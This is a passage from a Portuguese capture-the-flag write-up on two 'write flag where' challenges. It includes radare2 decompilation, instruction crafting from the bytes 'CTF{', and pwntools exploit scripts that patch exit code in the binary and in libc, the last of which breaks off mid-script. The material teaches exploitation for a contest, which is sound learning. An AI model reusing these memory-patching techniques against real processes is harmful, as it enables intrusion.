<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>io.interactive()</span></code></pre></div>
<h2 id="second-challenge">Second challenge</h2>
<p>No segundo challenge, as coisas ficam um pouco mais complicadas, não
temos mais uma string para sobrescrever, a única diferença desse para o
anterior é a remoção do <code>dprintf</code> com a string “Give me an
address and a length just so”.</p>
<p>Pensamos em forçar algum erro dentro da libc como um abort da
malloc(”free(): double free detected in tcache 2”), poderíamos
sobrescrever essa string na libc e forçar qualquer tipo de erro, mas não
funcionou, como visto antes, ao tentar escrever no <em>stderr</em>, o
output será redirecionado para <code>/dev/null</code>.</p>
<p>Tentando achar novos alvos para escrever a flag estava lendo as
strings do binário, e achei algo interessante:</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> strings ./chal</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Somehow</span> you got here<span class="pp">??</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
<p>Não tinha visto essa string até agora, onde que ela está? Algum
código secreto? Como Ida pude ver que existia um bloco de código
desconexo do fluxo do programa, mas no radare2 ficou muito mais
claro:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> r2 <span class="at">-AA</span> ./chal_patched</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[0x00001100]</span><span class="op">&gt;</span> pdg @ main</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">//</span> WARNING: Variable defined which should be unmapped: fildes</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">//</span> WARNING: Could not reconcile some variable overlaps</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">ulong</span> main<span class="er">(</span><span class="ex">void</span><span class="kw">)</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">int32_t</span> iVar1<span class="kw">;</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> uVar2<span class="kw">;</span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">int64_t</span> iVar3<span class="kw">;</span></span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> buf<span class="kw">;</span></span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_68h<span class="kw">;</span></span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_60h<span class="kw">;</span></span>
<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_58h<span class="kw">;</span></span>
<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_50h<span class="kw">;</span></span>
<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_48h<span class="kw">;</span></span>
<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_40h<span class="kw">;</span></span>
<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> var_38h<span class="kw">;</span></span>
<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> nbytes<span class="kw">;</span></span>
<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>    <span class="ex">uint</span> fd<span class="kw">;</span></span>
<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>    <span class="ex">uint</span> var_14h<span class="kw">;</span></span>
<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>    <span class="ex">uint</span> var_10h<span class="kw">;</span></span>
<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>    <span class="ex">uint</span> var_ch<span class="kw">;</span></span>
<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>    <span class="ex">int32_t</span> var_8h<span class="kw">;</span></span>
<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ulong</span> fildes<span class="kw">;</span></span>
<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>    <span class="ex">fildes._0_4_</span> = sym.imp.open<span class="er">(</span><span class="st">&quot;/proc/self/maps&quot;</span><span class="ex">,</span> 0<span class="kw">);</span></span>
<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>    <span class="ex">sym.imp.read</span><span class="er">(</span><span class="ex">fildes,</span> obj.maps, 0x1000<span class="kw">);</span></span>
<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>    <span class="ex">sym.imp.close</span><span class="er">(</span><span class="ex">fildes</span><span class="kw">);</span></span>
<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>    <span class="ex">var_8h</span> = sym.imp.open<span class="er">(</span><span class="st">&quot;./flag.txt&quot;</span><span class="ex">,</span> 0<span class="kw">);</span></span>
<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">(</span><span class="ex">var_8h</span> == <span class="at">-1</span><span class="kw">)</span> <span class="kw">{</span></span>
<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a>        <span class="ex">sym.imp.puts</span><span class="er">(</span><span class="st">&quot;flag.txt not found&quot;</span><span class="kw">);</span></span>
<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>        <span class="ex">uVar2</span> = 1<span class="kw">;</span></span>
<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>    <span class="kw">}</span></span>
<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span> <span class="kw">{</span></span>
<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>        <span class="ex">iVar3</span> = sym.imp.read<span class="er">(</span><span class="ex">var_8h,</span> obj.flag, 0x80<span class="kw">);</span></span>
<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">(</span><span class="ex">iVar3</span> <span class="op">&lt;</span> 1<span class="kw">)</span> <span class="kw">{</span></span>
<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.puts</span><span class="er">(</span><span class="st">&quot;flag.txt empty&quot;</span><span class="kw">);</span></span>
<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a>            <span class="ex">uVar2</span> = 1<span class="kw">;</span></span>
<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a>        <span class="kw">}</span></span>
<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="kw">{</span></span>
<span id="cb7-45"><a href="#cb7-45" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.close</span><span class="er">(</span><span class="ex">var_8h</span><span class="kw">);</span></span>
<span id="cb7-46"><a href="#cb7-46" aria-hidden="true" tabindex="-1"></a>            <span class="ex">var_ch</span> = sym.imp.dup2<span class="er">(</span><span class="ex">1,</span> 0x539<span class="kw">);</span></span>
<span id="cb7-47"><a href="#cb7-47" aria-hidden="true" tabindex="-1"></a>            <span class="ex">var_10h</span> = sym.imp.open<span class="er">(</span><span class="st">&quot;/dev/null&quot;</span><span class="ex">,</span> 2<span class="kw">);</span></span>
<span id="cb7-48"><a href="#cb7-48" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dup2</span><span class="er">(</span><span class="ex">var_10h,</span> 0<span class="kw">);</span></span>
<span id="cb7-49"><a href="#cb7-49" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dup2</span><span class="er">(</span><span class="ex">var_10h,</span> 1<span class="kw">);</span></span>
<span id="cb7-50"><a href="#cb7-50" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dup2</span><span class="er">(</span><span class="ex">var_10h,</span> 2<span class="kw">);</span></span>
<span id="cb7-51"><a href="#cb7-51" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.close</span><span class="er">(</span><span class="ex">var_10h</span><span class="kw">);</span></span>
<span id="cb7-52"><a href="#cb7-52" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.alarm</span><span class="er">(</span><span class="ex">0x3c</span><span class="kw">);</span></span>
<span id="cb7-53"><a href="#cb7-53" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dprintf</span><span class="er">(</span><span class="ex">var_ch,</span> </span>
<span id="cb7-54"><a href="#cb7-54" aria-hidden="true" tabindex="-1"></a>                            <span class="st">&quot;Was that too easy? Let\&#39;s make it tough\nIt\&#39;s the challenge from before, but I\&#39;ve removed all the fluff\n&quot;</span></span>
<span id="cb7-55"><a href="#cb7-55" aria-hidden="true" tabindex="-1"></a>                           <span class="kw">);</span></span>
<span id="cb7-56"><a href="#cb7-56" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dprintf</span><span class="er">(</span><span class="ex">var_ch,</span> <span class="st">&quot;%s\n\n&quot;</span>, obj.maps<span class="kw">);</span></span>
<span id="cb7-57"><a href="#cb7-57" aria-hidden="true" tabindex="-1"></a>            <span class="cf">while</span><span class="kw">(</span> <span class="fu">true</span> <span class="kw">)</span> <span class="kw">{</span></span>
<span id="cb7-58"><a href="#cb7-58" aria-hidden="true" tabindex="-1"></a>                <span class="ex">buf</span> = 0<span class="kw">;</span></span>
<span id="cb7-59"><a href="#cb7-59" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_68h</span> = 0<span class="kw">;</span></span>
<span id="cb7-60"><a href="#cb7-60" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_60h</span> = 0<span class="kw">;</span></span>
<span id="cb7-61"><a href="#cb7-61" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_58h</span> = 0<span class="kw">;</span></span>
<span id="cb7-62"><a href="#cb7-62" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_50h</span> = 0<span class="kw">;</span></span>
<span id="cb7-63"><a href="#cb7-63" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_48h</span> = 0<span class="kw">;</span></span>
<span id="cb7-64"><a href="#cb7-64" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_40h</span> = 0<span class="kw">;</span></span>
<span id="cb7-65"><a href="#cb7-65" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_38h</span> = 0<span class="kw">;</span></span>
<span id="cb7-66"><a href="#cb7-66" aria-hidden="true" tabindex="-1"></a>                <span class="ex">var_14h</span> = sym.imp.read<span class="er">(</span><span class="ex">var_ch,</span> <span class="kw">&amp;</span><span class="ex">buf,</span> 0x40<span class="kw">);</span></span>
<span id="cb7-67"><a href="#cb7-67" aria-hidden="true" tabindex="-1"></a>                <span class="ex">iVar1</span> = sym.imp.__isoc99_sscanf<span class="er">(</span><span class="kw">&amp;</span><span class="ex">buf,</span> <span class="st">&quot;0x%llx %u&quot;</span>, <span class="kw">&amp;</span><span class="ex">nbytes</span> + 4, <span class="kw">&amp;</span><span class="ex">nbytes</span><span class="kw">);</span></span>
<span id="cb7-68"><a href="#cb7-68" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="kw">((</span><span class="ex">iVar1</span> != 2<span class="kw">)</span> <span class="kw">||</span> <span class="kw">(</span><span class="ex">0x7f</span> <span class="op">&lt;</span> nbytes<span class="kw">))</span> <span class="cf">break</span><span class="kw">;</span></span>
<span id="cb7-69"><a href="#cb7-69" aria-hidden="true" tabindex="-1"></a>                <span class="ex">fd</span> = sym.imp.open<span class="er">(</span><span class="st">&quot;/proc/self/mem&quot;</span><span class="ex">,</span> 2<span class="kw">);</span></span>
<span id="cb7-70"><a href="#cb7-70" aria-hidden="true" tabindex="-1"></a>                <span class="ex">sym.imp.lseek64</span><span class="er">(</span><span class="ex">fd,</span> stack0xffffffffffffffd8, 0<span class="kw">);</span></span>
<span id="cb7-71"><a href="#cb7-71" aria-hidden="true" tabindex="-1"></a>                <span class="ex">sym.imp.write</span><span class="er">(</span><span class="ex">fd,</span> obj.flag, nbytes<span class="kw">);</span></span>
<span id="cb7-72"><a href="#cb7-72" aria-hidden="true" tabindex="-1"></a>                <span class="fu">sym.imp.close()</span><span class="kw">;</span></span>
<span id="cb7-73"><a href="#cb7-73" aria-hidden="true" tabindex="-1"></a>            <span class="kw">}</span></span>
<span id="cb7-74"><a href="#cb7-74" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.exit</span><span class="er">(</span><span class="ex">0</span><span class="kw">);</span></span>
<span id="cb7-75"><a href="#cb7-75" aria-hidden="true" tabindex="-1"></a><span class="ex">//</span> [] Depois do exit existe mais codigo</span>
<span id="cb7-76"><a href="#cb7-76" aria-hidden="true" tabindex="-1"></a>            <span class="ex">sym.imp.dprintf</span><span class="er">(</span><span class="ex">var_ch,</span> <span class="st">&quot;Somehow you got here??\n&quot;</span><span class="kw">);</span></span>
<span id="cb7-77"><a href="#cb7-77" aria-hidden="true" tabindex="-1"></a>            <span class="ex">uVar2</span> = sym.imp.abort<span class="er">(</span><span class="kw">);</span></span>
<span id="cb7-78"><a href="#cb7-78" aria-hidden="true" tabindex="-1"></a>        <span class="kw">}</span></span>
<span id="cb7-79"><a href="#cb7-79" aria-hidden="true" tabindex="-1"></a>    <span class="kw">}</span></span>
<span id="cb7-80"><a href="#cb7-80" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="ex">uVar2</span><span class="kw">;</span></span>
<span id="cb7-81"><a href="#cb7-81" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
<span id="cb7-82"><a href="#cb7-82" aria-hidden="true" tabindex="-1"></a><span class="ex">[0x00001100]</span><span class="op">&gt;</span></span></code></pre></div>
<p>Perfeito! Agora temos um alvo, sobrescrevemos a string “Somehow you
got here??” com a nossa flag, e após isso “pulamos” a
<code>exit</code>.</p>
<p>Para ignorar o <code>call exit</code>, usei o pattern da flag para
escrever uma instrução, como podemos escolher quantos bytes queremos
escrever, vamos escrever em <code>call exit</code> “CCCCT”:</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> python3</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> hex<span class="kw">(</span><span class="ex">ord</span><span class="er">(</span><span class="st">&#39;C&#39;</span><span class="kw">))</span><span class="ex">,</span> hex<span class="er">(</span><span class="ex">ord</span><span class="er">(</span><span class="st">&#39;T&#39;</span><span class="kw">))</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="st">&#39;0x43&#39;</span><span class="ex">,</span> <span class="st">&#39;0x54&#39;</span><span class="kw">)</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> rasm2 <span class="at">-ax86</span> <span class="at">-b64</span> <span class="at">-d</span> 0x4343434354</span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> r12</span></code></pre></div>
<p>Com isso, podemos “ignorar” o <code>exit</code> e alcançar o dprintf
desejado.</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># pwn template ./chal --host wfw2.2023.ctfcompetition.com --port 1337</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>...</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>io <span class="op">=</span> start()</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>io.recvuntil(<span class="st">b&quot;It&#39;s the challenge from before, but I&#39;ve removed all the fluff&quot;</span>)</span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>maps <span class="op">=</span> io.recvuntil(<span class="st">b&#39;</span><span class="ch">\n\n</span><span class="st">&#39;</span>)</span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>elf_base <span class="op">=</span> parse_maps(maps)</span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Elf start: &#39;</span> <span class="op">+</span> <span class="bu">hex</span>(elf_base))</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="co"># pause()</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="co"># ljust(0x40) for fill each read buffer</span></span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> <span class="kw">lambda</span> x, y: (<span class="bu">hex</span>(x) <span class="op">+</span> <span class="st">&#39; &#39;</span> <span class="op">+</span> <span class="bu">str</span>(y)).encode().ljust(<span class="bn">0x40</span>, <span class="st">b&#39;</span><span class="ch">\0</span><span class="st">&#39;</span>)</span>
<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>string_addr <span class="op">=</span> elf_base <span class="op">+</span> <span class="bn">0x20d5</span></span>
<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a>io.send(p(string_addr, <span class="dv">100</span>))</span>
<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="co"># create push r12 from &quot;C&quot; and &quot;CT&quot; from flag</span></span>
<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a><span class="co"># two pushes are needed because of stack alignment</span></span>
<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a>before_call_exit <span class="op">=</span> elf_base <span class="op">+</span> <span class="bn">0x143b</span></span>
<span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a>io.send(p(before_call_exit, <span class="dv">1</span>))</span>
<span id="cb9-23"><a href="#cb9-23" aria-hidden="true" tabindex="-1"></a>io.send(p(before_call_exit<span class="op">+</span><span class="dv">1</span>, <span class="dv">1</span>))</span>
<span id="cb9-24"><a href="#cb9-24" aria-hidden="true" tabindex="-1"></a>io.send(p(before_call_exit<span class="op">+</span><span class="dv">2</span>, <span class="dv">1</span>))</span>
<span id="cb9-25"><a href="#cb9-25" aria-hidden="true" tabindex="-1"></a>io.send(p(before_call_exit<span class="op">+</span><span class="dv">3</span>, <span class="dv">2</span>))</span>
<span id="cb9-26"><a href="#cb9-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-27"><a href="#cb9-27" aria-hidden="true" tabindex="-1"></a>call_exit <span class="op">=</span> elf_base <span class="op">+</span> <span class="bn">0x1440</span></span>
<span id="cb9-28"><a href="#cb9-28" aria-hidden="true" tabindex="-1"></a>io.send(p(call_exit, <span class="dv">1</span>))</span>
<span id="cb9-29"><a href="#cb9-29" aria-hidden="true" tabindex="-1"></a>io.send(p(call_exit<span class="op">+</span><span class="dv">1</span>, <span class="dv">1</span>))</span>
<span id="cb9-30"><a href="#cb9-30" aria-hidden="true" tabindex="-1"></a>io.send(p(call_exit<span class="op">+</span><span class="dv">2</span>, <span class="dv">1</span>))</span>
<span id="cb9-31"><a href="#cb9-31" aria-hidden="true" tabindex="-1"></a>io.send(p(call_exit<span class="op">+</span><span class="dv">3</span>, <span class="dv">2</span>))</span>
<span id="cb9-32"><a href="#cb9-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-33"><a href="#cb9-33" aria-hidden="true" tabindex="-1"></a><span class="co"># force exit</span></span>
<span id="cb9-34"><a href="#cb9-34" aria-hidden="true" tabindex="-1"></a>io.sendline(<span class="st">b&#39;asd&#39;</span>)</span>
<span id="cb9-35"><a href="#cb9-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-36"><a href="#cb9-36" aria-hidden="true" tabindex="-1"></a>io.interactive()</span></code></pre></div>
<h2 id="last-challenge">Last challenge</h2>
<p>Esse é o último e mais difícil desafio, agora não podemos mais
escrever dentro do ELF, existe um if que valida que o endereço inserido
não esteja dentro do range do binário, em outras palavras, devemos agora
ler a flag apenas escrevendo dentro da libc.</p>
<p>Voltamos a cogitar forçar algum erro dentro da libc para escrever a
flag, a ideia era escrever em <code>_IO_2_1_stderr_</code> e alterar o
campo <code>_fd</code> para 1337, isso funcionaria… mas não temos como
escrever 1337, apenas combinações de “C”, “CT”, “CTF” e “CTF{”.</p>
<p>Enquanto eu e meu teammate <span class="citation"
data-cites="delcon_maki">@delcon_maki</span> tentávamos descobrir quais
instruções poderíamos criar, achamos algo útil:</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>r3tr0<span class="op">@</span>pwnmachine:<span class="op">~</span>$ python3</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">hex</span>(<span class="bu">ord</span>(<span class="st">&#39;C&#39;</span>)), <span class="bu">hex</span>(<span class="bu">ord</span>(<span class="st">&#39;T&#39;</span>)), <span class="bu">hex</span>(<span class="bu">ord</span>(<span class="st">&#39;F&#39;</span>)), <span class="bu">hex</span>(<span class="bu">ord</span>(<span class="st">&#39;{&#39;</span>))</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>(<span class="st">&#39;0x43&#39;</span>, <span class="st">&#39;0x54&#39;</span>, <span class="st">&#39;0x46&#39;</span>, <span class="st">&#39;0x7b&#39;</span>)</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x43 54 46 7b 43 54</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="co">#   C  T  F  {  C  T</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>r3tr0<span class="op">@</span>pwnmachine:<span class="op">~</span>$ rasm2 <span class="op">-</span>ax86 <span class="op">-</span>b64 <span class="op">-</span>d <span class="bn">0x4354467b4354</span> </span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>push r12</span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>jnp <span class="bn">0x48</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>push rsp</span></code></pre></div>
<p>A instrução “jnp” realiza um jump caso PF=0, com isso escrevemos um
exploit seguindo o seguinte plano:</p>
<ul>
<li>Sobreescrevemos as primeiras instruções do exit dentro da libc e
pulamos a criação do stack frame</li>
<li>Caímos na função adjacente e esperamos chegar até o “ret”</li>
<li>Escrevemos um rop chain</li>
<li>profit :D</li>
</ul>
<p>O exploit final:</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co"># pwn template ./chal --host wfw3.2023.ctfcompetition.com --port 1337</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>...</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>io <span class="op">=</span> start()</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>io.recvuntil(<span class="st">b&quot;For otherwise I will surely expire&quot;</span>)</span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>maps <span class="op">=</span> io.recvuntil(<span class="st">b&#39;</span><span class="ch">\n\n</span><span class="st">&#39;</span>)</span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>libc_base, elf_base <span class="op">=</span> parse_maps(maps)</span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> libc_base</span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>exe.address <span class="op">=</span> elf_base</span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Libc base: &#39;</span> <span class="op">+</span> <span class="bu">hex</span>(libc_base))</span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Elf base: &#39;</span> <span class="op">+</span> <span class="bu">hex</span>(exe.address))</span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a><span class="co"># pause()</span></span>
<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> <span class="kw">lambda</span> x, y: (<span class="bu">hex</span>(x) <span class="op">+</span> <span class="st">&#39; &#39;</span> <span class="op">+</span> <span class="bu">str</span>(y)).encode().ljust(<span class="bn">0x40</span>, <span class="st">b&#39;</span><span class="ch">\0</span><span class="st">&#39;</span>)</span>
<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>__run_exit_handlers <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x4560b</span></span>
<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>io.send(p(__run_exit_handlers, <span class="dv">1</span>))</span>
<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>io.send(p(__run_exit_handlers <span class="op">+</span> <span class="dv">1</span>, <span class="dv">1</span>))</span>
<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>io.send(p(__run_exit_handlers <span class="op">+</span> <span class="dv">2</span>, <span class="dv">1</span>))</span>
<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>io.send(p(__run_exit_handlers <span class="op">+</span> <span class="dv">3</span>, <span class="dv">2</span>))</span>
<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>exit_addr <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x455f0</span></span>
<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>io.send(p(exit_addr, <span class="dv">4</span>))</span>
<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a>io.send(p(exit_addr<span class="op">+</span><span class="dv">4</span>, <span class="dv">2</span>))</span>
<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x43 54 46 7b 43 54</span></span>
<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a><span class="co">#   C  T  F  {  C  T</span></span>
